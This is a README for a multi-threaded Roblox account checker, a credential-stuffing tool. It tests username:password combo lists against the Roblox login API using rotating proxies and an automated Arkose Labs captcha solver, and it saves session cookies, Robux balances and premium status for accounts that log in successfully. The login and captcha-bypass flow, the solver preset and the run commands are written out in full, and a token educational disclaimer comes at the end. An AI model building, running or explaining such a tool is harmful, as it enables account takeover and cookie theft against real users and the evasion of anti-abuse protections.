<h1>boploks Account Checker</h1><p>A full-featured, multi-threaded boploks account checker with integrated Arkose Labs Funcaptcha solving via the <code>funcaptcha-solver</code> API.</p><h2>Features</h2><ul> <li><strong>Accurate Roblox Login API</strong> — Uses <code>auth.roblox.com/v2/login</code> with proper CSRF tokens, challenge metadata headers, and captcha provider handling</li> <li><strong>Funcaptcha Integration</strong> — Connects to the local <code>funcaptcha-solver</code> API to automatically solve Arkose Labs captcha challenges during login</li> <li><strong>Combo Format</strong> — Simple <code>username:password</code> combo file (one per line)</li> <li><strong>Multi-threaded</strong> — Configurable thread count for parallel checking</li> <li><strong>Proxy Support</strong> — Load and rotate HTTP/HTTPS/SOCKS proxies</li> <li><strong>Result Categorization</strong> — Automatically sorts results into:<ul> <li><strong>Hits</strong> — Valid accounts with <code>.ROBLOSECURITY</code> cookies</li> <li><strong>2FA</strong> — Accounts requiring two-step verification</li> <li><strong>Invalid</strong> — Wrong credentials</li> <li><strong>Locked</strong> — Banned/suspended accounts</li> <li><strong>Captcha Failed</strong> — Accounts where captcha could not be solved</li> <li><strong>Errors</strong> — Unexpected errors</li> </ul> </li> <li><strong>Account Enrichment</strong> — For hits, automatically retrieves:<ul> <li>Display name</li> <li>User ID</li> <li>Robux balance</li> <li>Premium status</li> </ul> </li> <li><strong>Real-time Stats</strong> — Live CPM, hit rate, and category counts</li> <li><strong>Colorized Output</strong> — Easy-to-read terminal output with ANSI colors</li> </ul><h2>Architecture</h2><pre><code>┌─────────────────┐     ┌──────────────────┐     ┌──────────────────┐
│  combo.txt      │────▶│  Roblox Checker  │────▶│  results/        │
│  user:pass      │     │  (Multi-thread)  │     │  hits.txt        │
└─────────────────┘     │                  │     │  cookies.txt     │
                        │  1. Get CSRF     │     │  2step.txt       │
┌─────────────────┐     │  2. POST login   │     │  invalid.txt     │
│  proxies.txt    │────▶│  3. Handle captcha│    │  locked.txt      │
│  (optional)     │     │  4. Parse result  │    │  captcha_*.txt   │
└─────────────────┘     │  5. Enrich hits   │    │  errors.txt      │
                        └────────┬─────────┘     └──────────────────┘
                                 │
                                 │ Captcha solve requests
                                 ▼
                        ┌──────────────────┐
                        │ funcaptcha-solver│
                        │ (Flask API :8003)│
                        │                  │
                        │ Solves Arkose    │
                        │ Labs Funcaptcha  │
                        │ for Roblox login │
                        └──────────────────┘
</code></pre><h2>Roblox Login API Flow</h2><p>The checker implements the full Roblox v2 login authentication flow:</p><ol> <li><strong>CSRF Token</strong> — <code>POST auth.roblox.com/v2/login</code> with empty body to obtain <code>X-CSRF-TOKEN</code> from response headers</li> <li><p><strong>Login Attempt</strong> — <code>POST auth.roblox.com/v2/login</code> with:</p><pre><code class="language-json">{
  "ctype": "Username",
  "cvalue": "username",
  "password": "password"
}
</code></pre> </li> <li><strong>Captcha Challenge</strong> — If response contains error code 2, extract:<ul> <li><code>dxBlob</code> — Base64 blob data for the funcaptcha challenge</li> <li><code>unifiedCaptchaId</code> — The captcha ID for re-submission</li> </ul> </li> <li><strong>Solve Captcha</strong> — Send the blob to <code>funcaptcha-solver</code> which:<ul> <li>Uses the Roblox login preset (<code>sitekey: 476068BF-9607-4799-B53D-966BE98E2B81</code>)</li> <li>Communicates with <code>arkoselabs.roblox.com</code></li> <li>Returns a solved captcha token</li> </ul> </li> <li><strong>Re-submit Login</strong> — POST to <code>/v2/login</code> again with:<ul> <li><code>captchaToken</code> in the body</li> <li><code>captchaProvider: "PROVIDER_ARKOSE_LABS"</code></li> <li><code>rblx-challenge-metadata</code> header (base64 JSON with captcha token + ID)</li> <li><code>rblx-challenge-id</code> header</li> <li><code>rblx-captcha-type: "Arkose Labs"</code> header</li> </ul> </li> <li><strong>Parse Result</strong> — Handle success (200 + <code>.ROBLOSECURITY</code> cookie), 2FA (code 1), invalid (code 0), locked (code 4)</li> </ol><h2>Setup</h2><h3>1. Install Node.js (Required)</h3><p>The funcaptcha-solver requires <strong>Node.js 16 or newer</strong> to run the JavaScript bridge (JSPyBridge) for tguess generation.</p><ul><li>Download and install from <a href="https://nodejs.org/">https://nodejs.org/</a></li><li>After installing, <strong>restart your terminal/command prompt</strong></li><li>Verify installation: <code>node --version</code></li></ul><p><strong>Windows users:</strong> If you installed Node.js via the Microsoft Store, it may not be on your PATH. Install from <a href="https://nodejs.org/">nodejs.org</a> instead. You may need to log out and log back in for PATH changes to take effect.</p><h3>2. Install Dependencies</h3><pre><code class="language-bash"># Checker dependencies
pip install requests colorama

# Funcaptcha-solver dependencies
cd funcaptcha-solver
pip install -r requirements.txt
npm install
</code></pre><h3>3. Start the Funcaptcha Solver</h3><pre><code class="language-bash">cd funcaptcha-solver
python main.py
</code></pre><p>This starts the solver API on <code>http://127.0.0.1:8003</code>.</p><h3>4. Prepare Your Combo File</h3><p>Create <code>combo.txt</code> with one <code>username:password</code> entry per line:</p><pre><code>username1:password123
username2:MyP@ssw0rd!
username3:another_pass
</code></pre><h3>5. (Optional) Add Proxies</h3><p>Create <code>proxies.txt</code> with one proxy per line. Supported formats:</p><pre><code>host:port
host:port:user:pass
user:pass@host:port
http://host:port
http://user:pass@host:port
socks5://host:port
</code></pre><h3>6. Run the Checker</h3><pre><code class="language-bash">python run_checker.py -c combo.txt -t 5
</code></pre><h2>Usage</h2><pre><code>python run_checker.py [OPTIONS]

Options:
  -c, --combo       Combo file path (default: combo.txt)
  -p, --proxies     Proxy file path (default: proxies.txt)
  -t, --threads     Number of threads (default: 5)
  --captcha-url     Captcha solver URL (default: http://127.0.0.1:8003)
  --use-proxies     Enable proxy usage
  --no-proxies      Disable proxy usage
  --delay           Delay between checks in seconds (default: 1.0)
</code></pre><h3>Examples</h3><p>Basic usage with default settings:</p><pre><code class="language-bash">python run_checker.py
</code></pre><p>With custom combo file and 10 threads:</p><pre><code class="language-bash">python run_checker.py -c my_combos.txt -t 10
</code></pre><p>With proxies enabled:</p><pre><code class="language-bash">python run_checker.py -c combo.txt -p proxies.txt --use-proxies -t 3
</code></pre><p>With custom captcha solver URL:</p><pre><code class="language-bash">python run_checker.py --captcha-url http://192.168.1.100:8003
</code></pre><h2>Output Files</h2><p>Results are saved to the <code>results/</code> directory:</p><table class="e-rte-table"> <thead> <tr> <th>File</th> <th>Description</th> </tr> </thead> <tbody><tr> <td><code>hits.txt</code></td> <td>Valid accounts with full details (cookie, userID, name, Robux, premium)</td> </tr> <tr> <td><code>cookies.txt</code></td> <td>Just <code>username | .ROBLOSECURITY cookie</code> for easy use</td> </tr> <tr> <td><code>2step.txt</code></td> <td>Accounts requiring two-factor authentication</td> </tr> <tr> <td><code>invalid.txt</code></td> <td>Wrong credentials</td> </tr> <tr> <td><code>locked.txt</code></td> <td>Banned/suspended accounts</td> </tr> <tr> <td><code>captcha_failed.txt</code></td> <td>Accounts where captcha solving failed</td> </tr> <tr> <td><code>errors.txt</code></td> <td>Unexpected errors</td> </tr> </tbody></table><h3>Hit Format Example</h3><pre><code>username:password | Cookie: LONG_ROBLOSECURITY_COOKIE... | UserID: 12345678 | DisplayName: PlayerName | Robux: 500 | Premium: Yes
</code></pre><h2>Configuration</h2><p>Edit <code>roblox_checker/config.py</code> to customize:</p><table class="e-rte-table"> <thead> <tr> <th>Setting</th> <th>Default</th> <th>Description</th> </tr> </thead> <tbody><tr> <td><code>MAX_THREADS</code></td> <td>5</td> <td>Number of concurrent checker threads</td> </tr> <tr> <td><code>MAX_CAPTCHA_RETRIES</code></td> <td>3</td> <td>Retries for captcha solving per account</td> </tr> <tr> <td><code>CHECK_DELAY</code></td> <td>1.0</td> <td>Seconds between each check</td> </tr> <tr> <td><code>REQUEST_TIMEOUT</code></td> <td>30</td> <td>HTTP request timeout</td> </tr> <tr> <td><code>CHROME_VERSION</code></td> <td>"130"</td> <td>Chrome version for fingerprinting</td> </tr> <tr> <td><code>PROXY_ENABLED</code></td> <td>False</td> <td>Enable/disable proxy usage</td> </tr> </tbody></table><h2>Funcaptcha Solver Preset</h2><p>The checker uses the <code>roblox_login</code> preset from funcaptcha-solver:</p><pre><code class="language-python">"roblox_login": {
    "siteurl": "https://www.roblox.com",
    "sitekey": "476068BF-9607-4799-B53D-966BE98E2B81",
    "apiurl": "https://arkoselabs.roblox.com",
    "data": {
        "window__ancestor_origins": ["https://www.roblox.com", "https://www.roblox.com"],
        "client_config__sitedata_location_href": "https://www.roblox.com/arkose/iframe",
        "window__tree_structure": "[[],[[]]]",
        "window__tree_index": [0, 0]
    }
}
</code></pre><h2>Error Codes Reference</h2><table class="e-rte-table"> <thead> <tr> <th>Code</th> <th>Meaning</th> <th>Checker Action</th> </tr> </thead> <tbody><tr> <td>0</td> <td>Invalid credentials</td> <td>Mark as INVALID</td> </tr> <tr> <td>1</td> <td>Two-step verification required</td> <td>Mark as 2STEP</td> </tr> <tr> <td>2</td> <td>Captcha required</td> <td>Solve captcha and retry login</td> </tr> <tr> <td>4</td> <td>Account locked/banned</td> <td>Mark as LOCKED</td> </tr> </tbody></table><h2>Disclaimer</h2><p>This tool is for educational and authorized testing purposes only. Unauthorized access to accounts is illegal. Use responsibly and only on accounts you own or have explicit permission to test.</p>
